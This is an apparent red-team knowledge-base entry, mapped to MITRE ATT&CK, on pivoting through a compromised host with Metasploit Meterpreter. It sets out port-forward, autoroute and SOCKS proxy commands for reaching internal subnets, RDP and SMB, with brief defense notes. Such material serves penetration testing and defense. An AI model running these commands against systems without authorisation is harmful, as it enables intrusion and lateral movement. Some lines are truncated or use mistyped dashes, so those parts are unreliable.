---
id: 4672cf37-9bf7-469e-824b-0ffad1c28c2a
name: Metasploit Network Pivoting with Meterpreter Port Forwarding and Routing
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:22.648756+00:00'
updated_at: '2023-04-10T20:25:13.211382+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Connection Proxy|T1090 - Connection Proxy]]'
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Metasploit]]'
- '[[Network Pivoting Techniques]]'
commands:
- '[[Add route for specific network]]'
- '[[Add route for specified subnet]]'
- '[[Delete all port forwards]]'
- '[[Delete all routes]]'
- '[[Delete RDP port forward]]'
- '[[Delete route for specific network]]'
- '[[Forward RDP traffic to compromised machine]]'
- '[[List active port forwards]]'
- '[[List all active routes]]'
- '[[Set up SOCKS proxy]]'
- '[[View available networks]]'
---

# Metasploit Network Pivoting with Meterpreter Port Forwarding and Routing

## Summary

Metasploit's Meterpreter provides a powerful tool for pivoting within a network. Using port forwarding and routing, an attacker can use a compromised host as a proxy to access other network segments. This technique can be used to bypass network segmentation and access sensitive data or systems. The

## Description

# Description

Metasploit's Meterpreter provides a powerful tool for pivoting within a network. Using port forwarding and routing, an attacker can use a compromised host as a proxy to access other network segments. This technique can be used to bypass network segmentation and access sensitive data or systems. The technical implementation involves setting up a listener on the compromised host and forwarding traffic through it. The business value of this technique is that it allows attackers to move laterally within a network and access additional resources that would otherwise be inaccessible.

## Requirements

1. Access to a compromised host within the target network

1. Metasploit framework installed on the attacker's system

## Defense

1. Segment networks to limit lateral movement

1. Implement network access controls to restrict traffic between segments

1. Monitor network traffic for signs of port forwarding or proxy use

## Objectives

1. Gain access to a compromised host within a network

1. Use Meterpreter to set up port forwarding and routing

1. Access other network segments and systems

# Instructions

1. This JSON object provides a set of commands for port forwarding and routing using Meterpreter. These commands can be used to forward ports, add and delete routes, and view active port forwards and routes. To use these commands, open a Meterpreter shell and enter the command in the terminal.

**Code**: [[# Meterpreter list active port forwards
portfwd li]]

> The 'portfwd list' command lists all active port forwards. The 'portfwd add' command forwards a specified local port to a remote host and port. The 'portfwd delete' command removes a specified port forward. The 'portfwd flush' command removes all port forwards.

The 'run autoroute -s' command adds a route for a specified subnet. The 'run autoroute -p' command lists all active routes. The 'route add' command adds a route for a specified network via a session number. The 'route delete' command removes a specified route. The 'route flush' command removes all routes.

**Command** ([[List active port forwards]]):

```bash
portfwd list
```

**Command** ([[Forward RDP traffic to compromised machine]]):

```bash
portfwd add –l 3389 –p 3389 –r target-host
portfwd add -l 88 -p 88 -r 127.0.0.1
portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
```

**Command** ([[Delete RDP port forward]]):

```bash
portfwd delete –l 3389 –p 3389 –r target-host
```

**Command** ([[Delete all port forwards]]):

```bash
portfwd flush
```

**Command** ([[Add route for specified subnet]]):

```bash
run autoroute -s 192.168.15.0/24
```

**Command** ([[Set up SOCKS proxy]]):

```bash
use auxiliary/server/socks_proxy
set SRVPORT 9090
set VERSION 4a
```

**Command** ([[List all active routes]]):

```bash
run autoroute -p
```

**Command** ([[View available networks]]):

```bash
route
```

**Command** ([[Add route for specific network]]):

```bash
route add 192.168.14.0 255.255.255.0 3
```

**Command** ([[Delete route for specific network]]):

```bash
route delete 192.168.14.0 255.255.255.0 3
```

**Command** ([[Delete all routes]]):

```bash
route flush
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Connection Proxy|T1090 - Connection Proxy]]
- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Add route for specific network]]
- [[Add route for specified subnet]]
- [[Delete all port forwards]]
- [[Delete all routes]]
- [[Delete RDP port forward]]
- [[Delete route for specific network]]
- [[Forward RDP traffic to compromised machine]]
- [[List active port forwards]]
- [[List all active routes]]
- [[Set up SOCKS proxy]]
- [[View available networks]]

## Tags

- [[Metasploit]]
- [[Network Pivoting Techniques]]
